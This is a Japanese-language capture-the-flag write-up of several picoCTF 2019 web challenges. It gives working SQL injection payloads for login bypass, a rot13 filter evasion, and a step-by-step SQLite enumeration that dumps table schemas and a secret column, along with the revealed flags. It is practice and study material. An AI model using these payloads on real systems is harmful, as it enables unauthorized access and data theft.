# writeup

# 常設の練習
## picoCTF 2019
https://ctftime.org/task/9545  
### Irish-Name-Repo 1
`https://2019shell1.picoctf.com/problem/47253/`  
SQLインジェクションでadminとしてログインする。  

`admin`,`' or 1=1 -- -`でログイン成功！  
### Irish-Name-Repo 2
`https://2019shell1.picoctf.com/problem/60775/`  
`admin' --`,`なんでも`でusernameの方のSQLインジェクションで成功！  
passwordの方がフィルタリングされてるらしい。`or`が使えないので`||`とかで代用したりいろいろしたがダメだった。  
```txt
// 成功したやつ
admin' --
admin' -- -
admin' ; --
admin' ;#

// 成功しなかったやつ
admin' #
```
### Irish-Name-Repo 3
`https://2019shell1.picoctf.com/problem/47247/`  
htmlのhiddenとして`debug=0`という値をフォームでパスワードと一緒に送信しているので`debug=1`とすると、実行しようとしている
SQL構文がわかる。どうやらpasswordのテキストをrot13で変換してからSQLに突っ込んでいるらしい。  
`' be 1 -- -`とすると`' or 1 -- -`と変換されて以下のように成功！  
```txt
SQL query: SELECT * FROM admin where password = '' or 1 -- -'
```
### Empire1
`https://2019shell1.picoctf.com/problem/4155/index`  
![image](https://user-images.githubusercontent.com/56021519/103904535-be749400-5140-11eb-906a-43c20766de27.png)  
ログインページにSQLインジェクションがあるかと思えばそういうわけじゃない。  
適当にRegisterして入ってみる。  
![image](https://user-images.githubusercontent.com/56021519/103904708-fa0f5e00-5140-11eb-8396-72ab168d4a4c.png)  
いろいろ試した結果、`Add a Todo`の`'`を挿入するとInternal Server Errorが返り、SQLインジェクションに脆弱だとわかる。  
![image](https://user-images.githubusercontent.com/56021519/103904777-14493c00-5141-11eb-963e-9cbf02554d78.png)  
次にInternal Server Errorが出ないようにして有効にSQLとして動くInjectionを探す。  
Your TodosでSQL実行結果を確認できる。  
```txt
// Internal Server Error
'
' or 1
' or 1=! -- -

// エラーがでない
' || 1=1 || '     1が返る
' || 1=2 || '     0が返る
```
したがって、`' || <SQL>  || '`の構文ならInternal Server Errorを出さずにSQL実行できるとわかる！  
次に、問題文からsecretをDBから取り出す必要があるので、DBを特定する必要がある。  
`' || @@version || '`が成功すればMySQLかMSSQL、`' || version() || '`ならPostgeSQL、`' || sqlite_version() || '`ならSQLiteとわかる。  
今回はSQLiteのやつで`3.22.0 `が返る！  
https://sqliteonline.com/  
ここで適宜ちゃんとSQLite上で動作できるのか触りながらやるとよさそう。  
SQLiteでは、以下のようにして、DB内に存在するテーブルやカラムなどを表示できる！超楽！  
`group_concat()`を使わないと、一つずつしか返ってこない。`users,apps`とかの場合は`users`しか返してくれないので。  
```txt
// 存在するテーブル一覧を返す
SELECT tbl_name FROM sqlite_master
SELECT group_concat(tbl_name) FROM sqlite_master

// 存在するテーブルとそのカラムをセットで返す。こっちの方が情報量多い
SELECT sql FROM sqlite_master
SELECT group_concat(sql) FROM sqlite_master
```
以下のようにして`user`テーブルの`secret`カラムのデータを呼び出すとフラグゲット！  
```txt
' || (SELECT group_concat(secret) FROM user) || '
Likes Oreos.,Know it all.,picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4} 

' || (SELECT secret FROM user) || '
Likes Oreos. 

' || (SELECT group_concat(tbl_name) FROM sqlite_master) || '
user,user,todo 

' || (SELECT tbl_name FROM sqlite_master) || '
user

' || (SELECT * FROM sqlite_master) || '
Internal Server error

' || (union select 10) || '
Internal Server error

' || (SELECT group_concat(sql) FROM sqlite_master) || '
CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) ),CREATE UNIQUE INDEX ix_user_username ON user (username),CREATE TABLE todo ( id INTEGER NOT NULL, item VARCHAR(256), user_id INTEGER, PRIMARY KEY (id), FOREIGN KEY(user_id) REFERENCES user (id) ) 
```
# メモ
https://www.hamayanhamayan.com/entry/2020/06/25/222618  
https://graneed.hatenablog.com/entry/2019/12/29/115100#SQL-Injection  
https://graneed.hatenablog.com/entry/2018/12/16/003745  
https://sqliteonline.com/  
